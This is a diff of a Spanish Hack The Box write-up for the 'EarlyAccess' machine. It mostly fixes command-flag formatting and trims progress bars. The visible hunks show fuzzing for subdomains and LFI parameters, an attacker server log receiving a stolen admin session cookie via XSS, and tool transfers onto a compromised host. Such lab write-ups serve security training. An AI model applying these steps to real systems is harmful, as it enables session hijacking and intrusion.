@@ -80,7 +80,7 @@ Vamos a obtener más información con un escaneo específico sobre los puertos q
 | -oN       | Guarda el output en un archivo con formato normal      |
 
 ```console
-p3ntest1ng:~$ nmap -sCV -p22,80,443 10.10.11.110 -oN targeted
+p3ntest1ng:~$ nmap -sCV -p 22,80,443 10.10.11.110 -oN targeted
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-04 00:15 CET
 Nmap scan report for 10.10.11.110
 Host is up (0.066s latency).
@@ -128,13 +128,13 @@ Podemos ver si existen subdominios con wfuzz, en este caso me estoy saltando el 
 | ---------- | :---------- |
 | -c         | Mostrar el output en formato colorizado |
 | -w         | Utiliza el diccionario especificado |
-| --hw=28,53 | Oculta los resultados con 28 y 53 palabras para evitar falsos positivos |
+| --hw 28,53 | Oculta los resultados con 28 y 53 palabras para evitar falsos positivos |
 | -H         | Realiza una consulta de tipo header |
 | -u         | Especifica la URL para la consulta |
 | -t         | Nos permite lanzar el comando con N threads |
 
 ```console
-p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hw=28,53 -H "Host: FUZZ.earlyaccess.htb" -u http://earlyaccess.htb/ -t 50 2>/dev/null
+p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hw 28,53 -H "Host: FUZZ.earlyaccess.htb" -u http://earlyaccess.htb/ -t 50 2>/dev/null
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -208,7 +208,7 @@ Guardamos los cambios y probamos a enviarle un mensaje al administrador. Tardar�
 Si todo ha ido bien, en nuestro servidor https deberemos ver la petición con la cookie del administrador:
 
 ```console
-python3 https_server.py 10.10.16.29 4443
+p3ntest1ng:~$ python3 https_server.py 10.10.16.29 4443
 Serving HTTPS on 10.10.16.29 port 4443 (https://10.10.16.29:4443/) ...
 10.10.11.110 - - [12/Feb/2022 17:57:52] "GET /?XSRF-TOKEN=eyJpdiI6InRHUVkzSEg5SEtnenJYNnZYVysyRWc9PSIsInZhbHVlIjoiZFBnenRQVS9GVXhETFdCOFpHUmZRTGJ2bkUzK2loeWxhbXMwSiswWE5RZWRTSzErVmhQM3NrazhobjU0cTFQSU9DZjdoMkYyMURJRmpHdGV0Q0NnTzNuRmJXU08zQlBjWGxvdjhQQXRVRjBXTGFwZlJHQjNaU0lPZ1RKeEJhNXAiLCJtYWMiOiI2OTNkNWU3MGNkNGY3OTkxZTFmOWZhNmQ5NmEzYWRiNzVmZDI1ZDg2OTBjYTQ0YzdkOTJmNzJmYzBjMjE2NjNjIn0%3D;%20earlyaccess_session=eyJpdiI6ImNYejdtbFZuWlo5UmZrd0JoN2RYY1E9PSIsInZhbHVlIjoiaHgxWTg1bUdBSWF5eHorK3VkSldUTGoxYVNtdHV2NTlkS1I3cTFZL0xzRVBHbHczZHIwU3NEMUY0Z3VqUlE0djJHaUlxZmNwN2d1UERZeVVOOThtVWUxVFcrcXlCSU5XOGlpUENmOGEzc2doa1ZncUQxUEw4MmlHdHErQ2h2S3kiLCJtYWMiOiJmNzlmZTc1ZmY5MjllYzk3ZTU0NmI3MDUzOTJmMjU3NzcxZTA4NzEyZjNjMjJjNmYyNGIxNTk2OGFiYjFmOTY5In0%3D HTTP/1.1" 200 -
 ```
@@ -367,10 +367,10 @@ Apliquemos un poco de fuzzing sobre este subdominio para ver si encontramos algo
 | --------- | :---------- |
 | -c        | Muestra el output en formato colorizado |
 | -w        | Utiliza el diccionario especificado |
-| --hc=404  | Oculta todos los códigos de estado 404 |
+| --hc 404  | Oculta todos los códigos de estado 404 |
 
 ```console
-p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc=404 http://dev.earlyaccess.htb/FUZZ 2>/dev/null
+p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://dev.earlyaccess.htb/FUZZ 2>/dev/null
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -402,7 +402,7 @@ Requests/sec.: 0
 Vemos que existe un directorio **`actions`** y archivo **`index.php`**, por lo que vamos a buscar más archivos de este tipo dentro de dicho directorio.
 
 ```console
-p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc=404 --hw=28 http://dev.earlyaccess.htb/actions/FUZZ.php -t 75 2>/dev/null
+p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 --hw 28 http://dev.earlyaccess.htb/actions/FUZZ.php -t 75 2>/dev/null
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -438,7 +438,7 @@ Aquí se empieza a tensar la cosa, porque por lo visto **`file.php`** es vulnera
 Vamos a fuzzear de nuevo este archivo en busca de parámetros que puedan ser vulnerables:
 
 ```console
-p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hh=35 -u 'http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd' 2>/dev/null
+p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hh 35 -u 'http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd' 2>/dev/null
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -596,7 +596,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 5944464 (5.7M) [application/octet-stream]
 Saving to: 'nmap'
 
-nmap    100%[====================================================================================================>]   5.67M  1.61MB/s    in 3.5s    
+nmap    100%[========================>]   5.67M  1.61MB/s    in 3.5s    
 
 2022-02-13 00:58:39 (1.61 MB/s) - 'nmap' saved [5944464/5944464]
 
@@ -766,7 +766,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 5944464 (5.7M) [application/octet-stream]
 Saving to: ‘nmap’
 
-nmap 100%[====================================================================================================>]   5.67M  2.23MB/s    in 2.5s    
+nmap 100%[========================>]   5.67M  2.23MB/s    in 2.5s    
 
 2022-02-13 02:43:19 (2.23 MB/s) - ‘nmap’ saved [5944464/5944464]
 
@@ -842,7 +842,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 5944464 (5.7M) [application/octet-stream]
 Saving to: 'nmap'
 
-nmap 100%[====================================================================================================>]   5.67M  1.29MB/s    in 5.9s    
+nmap 100%[========================>]   5.67M  1.29MB/s    in 5.9s    
 
 2022-02-13 02:07:14 (984 KB/s) - 'nmap' saved [5944464/5944464]
 
@@ -898,7 +898,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 8077312 (7.7M) [application/octet-stream]
 Saving to: 'chisel'
 
-chisel 100%[====================================================================================================>]   7.70M  2.15MB/s    in 3.7s    
+chisel 100%[========================>]   7.70M  2.15MB/s    in 3.7s    
 
 2022-02-13 02:37:35 (2.06 MB/s) - 'chisel' saved [8077312/8077312]
 game-tester@game-server:/tmp/wildzarek$ chmod +x chisel
@@ -1117,5 +1117,6 @@ De este modo podemos leer también el archivo **`id_rsa`** que se encuentra en *
 
 ### ¡Gracias por leer hasta el final!
 
-#### Una máquina acorde a su nivel, con mucha enumeración y varias técnicas/vulnerabilidades distintas que explotar, muy entretenida.
+Una máquina acorde a su nivel, con mucha enumeración y varias técnicas/vulnerabilidades distintas que explotar, muy entretenida.
+
 #### Nos vemos en un próximo. ¡Feliz hacking! ☠
